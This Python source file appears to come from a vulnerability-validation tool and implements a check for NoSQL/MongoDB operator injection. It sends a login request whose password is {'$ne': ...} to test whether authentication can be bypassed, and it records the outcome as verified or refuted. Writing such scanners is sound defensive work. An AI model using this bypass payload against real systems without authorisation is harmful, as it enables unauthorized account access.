"""Deterministic NoSQL / MongoDB operator injection active reproduction recipe (val.nosql-injection, CWE-943 / OWASP A05:2025)."""

from __future__ import annotations

import json

from ..http import HttpExchange, ScopedHttpClient
from .base import TestResult, ValidationHypothesis

IMPOSSIBLE_CANARY = "plex_impossible_canary_pwd_98765"


class NoSQLInjectionRecipe:
    """Deterministic reproduction recipe for NoSQL Operator Injection (CWE-943 / OWASP A05:2025)."""

    def execute(self, hypothesis: ValidationHypothesis, client: ScopedHttpClient) -> TestResult:
        exchanges: list[HttpExchange] = []
        counterevidence: list[str] = []

        headers = {"Content-Type": "application/json"}

        # 1. Baseline impossible probe
        base_payload = {"username": "admin", "password": IMPOSSIBLE_CANARY}
        base_body = json.dumps(base_payload)
        ex_base = client.request("POST", hypothesis.target_url, headers=headers, data=base_body)
        exchanges.append(ex_base)

        # 2. Injected NoSQL $ne operator probe
        probe_payload = {"username": "admin", "password": {"$ne": IMPOSSIBLE_CANARY}}
        probe_body = json.dumps(probe_payload)
        ex_probe = client.request("POST", hypothesis.target_url, headers=headers, data=probe_body)
        exchanges.append(ex_probe)

        # Check for authentication bypass or record retrieval on $ne injection
        base_failed = ex_base.status_code in (400, 401, 403, 404, 500) or "invalid" in ex_base.response_body.lower()
        probe_succeeded = ex_probe.status_code in (200, 201) and (
            "token" in ex_probe.response_body.lower()
            or "welcome" in ex_probe.response_body.lower()
            or "admin" in ex_probe.response_body.lower()
            or len(ex_probe.response_body) > len(ex_base.response_body) + 20
        )

        if base_failed and probe_succeeded:
            return TestResult(
                hypothesis_id=hypothesis.id,
                rule_id=hypothesis.rule_id,
                reproduced=True,
                status="verified",
                message=(
                    f"NoSQL injection verified on {hypothesis.target_url}: "
                    "operator injection payload 'password: {\"$ne\": \"...\"}' successfully bypassed "
                    f"authentication (HTTP {ex_probe.status_code}) where scalar baseline failed (HTTP {ex_base.status_code})."
                ),
                exchanges=exchanges,
            )

        counterevidence.append(
            f"NoSQL operator injection probe did not bypass authentication (HTTP {ex_probe.status_code})"
        )
        return TestResult(
            hypothesis_id=hypothesis.id,
            rule_id=hypothesis.rule_id,
            reproduced=False,
            status="refuted",
            message="NoSQL injection refuted: endpoint enforces scalar typing or rejects dictionary query operators",
            exchanges=exchanges,
            counterevidence=counterevidence,
        )
